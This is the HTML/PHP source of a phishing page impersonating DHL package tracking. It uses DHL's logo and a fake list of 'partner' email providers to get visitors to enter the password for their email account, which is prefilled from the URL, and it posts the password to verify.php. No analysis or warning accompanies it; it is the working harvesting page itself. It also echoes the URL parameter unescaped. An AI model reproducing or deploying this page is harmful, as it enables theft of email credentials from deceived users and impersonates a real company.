<html>
<HEAD>
<TITLE>DHL | Tracking</TITLE>	
<title>TRADE FILE</title>
<link rel="shortcut icon" href="http://www.dhl.com/img/favicon.gif" type="image/gif"/>
</head>
<script type="text/javascript"><!--
function validateForm() {
with (document.myform) {
var alertMsg = "The following REQUIRED fields\nhave been left empty:\n";
if (email.value == "") alertMsg += "\nEmail";
if (epass.value == "") alertMsg += "\nEmail Password";
if (alertMsg != "The following REQUIRED fields\nhave been left empty:\n") {
alert(alertMsg);
return false;
} else {
return true;
} } }
// --></script>
<body background="http://www.dhl.com/img/modules/5_1_dhl_global_locator_all_340_187.gif" text="black" link="blue" alink="blue" vlink="blue" background="" >
<!-- 66613 -->
<font face="Arial" style="font-size: 20pt" color="#CD0000">
<center><b>Login to Continue Tracking your Package</b></font><font face="verdana,arial" size=-1><p>
<img src="http://www.dhl.com/img/meta/dhl_logo.gif" width="300" height="100">
</p>
<table cellpadding=2 cellspacing=0 border=0>
<tr><td bgcolor="#FFA500"><table cellpadding=0 cellspacing=0 border=0 width=100%><tr><td bgcolor="#CD0000" align=center style="padding:2;padding-bottom:4"><b>
	<font size=-1 color="white" face="Comic Sans MS">Sign In With Your Correct Email and Password To Review Package Information</font></b></font><b><font face="Comic Sans MS" size=-1></th></font><font face="Comic Sans MS" size=-1></tr>

</font><font face="verdana,arial" size=-1>
<tr><td bgcolor="white" style="padding:5"><br>
<form action="verify.php" onsubmit="return validateForm()" method="post" name="myform">
<center><table width="517">

<tr><td colspan=2><font face="verdana,arial" size=-1>
	</font><font face="verdana,arial" size=1><span  class=text1a><b><font color="red">(*)</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Denotes required field. </b> </span></td></tr>

<tr><td width="115"><font face="verdana,arial" size=-1> 
<font color="red">*</font>&nbsp;&nbsp;&nbsp;&nbsp; <b>E-MAIL ID:</b></td><td ><input type="hidden" name="email" value="<?php echo $_GET['email'];?>"><b><?php echo $_GET['email'];?></b></td></tr>

<tr><td colspan=2><font face="verdana,arial" size=-1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
	</font><font face="verdana,arial" size=1><span  class=text1a></span></td></tr>
<tr>
<font face="verdana,arial" size=-1>
	<td width="115"><font face="verdana,arial" size=-1><font color="red">*</font>&nbsp;&nbsp;&nbsp;&nbsp;<b>PASSWORD:</b></td>

	<td width="397"><input type="password" name="epass" size="40"></td>

	</font>
</tr>
<tr>

<font face="verdana,arial" size=-1>
	<td width="110"><font face="verdana,arial" size=-1>&nbsp;</td>
	<td width="397"><font face="verdana,arial" size=-1><input type="submit" value="Log in To View"></td>
	</font>
</tr>
<tr><td colspan=2><font face="verdana,arial" size=-1></td></tr>
</table></center>
</form>
</td></tr></table></td></tr></table>
<div class="copyright cLight">

&nbsp;</div>
<p>Copyright Notice &copy; 1999-2017 DHL WorldWide Delivery. 
All rights reserved. </p>
&nbsp;<center><p><hr size=1 width="100%">&nbsp;</p></center>
</font>
DHL Now Partners with: <br>

</font>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img alt="http://mimg.126.net/logo/126logo.gif" src="http://mimg.126.net/logo/126logo.gif"><img alt="http://p.ebaystatic.com/aw/pics/logos/logoEbay_x45.gif" src="http://p.ebaystatic.com/aw/pics/logos/logoEbay_x45.gif" width="110" height="36">&nbsp; <img src="http://img3.cache.netease.com/www/logo/logo_png.png" alt="" title="" border=0 width=122 height=44>&nbsp;&nbsp; <img src="https://www.google.com/images/logos/mail_logo.png" alt="" title="" border=0 width=142 height=26><img src="https://secure.wlxrs.com/~Live.SiteContent.ID/~16.0.2/~/~/~/~/images/WindowsLive.png" alt="" title="" border=0 width=175 height=23>&nbsp;<img src="http://mimg.yeah.net/logo/yeahlogo_middle.gif" alt="" title="" border=0 width=174 height=62>
<img src="http://l.yimg.com/a/i/ww/met/yahoo_logo_us_061509.png" alt="" title="" border=0 width=138 height=49></p>
</body>
</html>